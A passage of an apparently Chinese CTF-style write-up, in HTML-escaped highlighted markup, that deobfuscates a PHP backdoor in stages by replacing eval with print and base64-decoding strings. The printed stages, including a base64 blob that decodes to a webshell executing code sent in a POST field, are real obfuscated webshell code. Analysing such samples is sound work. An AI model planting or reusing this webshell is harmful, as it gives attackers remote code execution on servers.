style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;);
	$do_me&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;($i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;$i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;($order);$i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
		$do_me&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$do_me&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$terms[$order[$i]];
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($do_me); 
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用国赛学来的方法，直接把 &lt;code&gt;eval&lt;/code&gt; 改成 &lt;code&gt;print&lt;/code&gt; 然后放在线环境运行一下，得到第二份脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$_&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
$__&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
$___&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($___($__));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这次好像在线环境运行不了，看一下字符串都是什么，复制到python里，发现 &lt;code&gt;$___&lt;/code&gt; 是 &lt;code&gt;base64_decode&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是把 &lt;code&gt;$__&lt;/code&gt; 解码一下，得到&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$code&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;base64_decode&lt;/span&gt;($_);&lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($code);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以只要解码 &lt;code&gt;$_&lt;/code&gt; 就可以了，得到&lt;/p&gt;
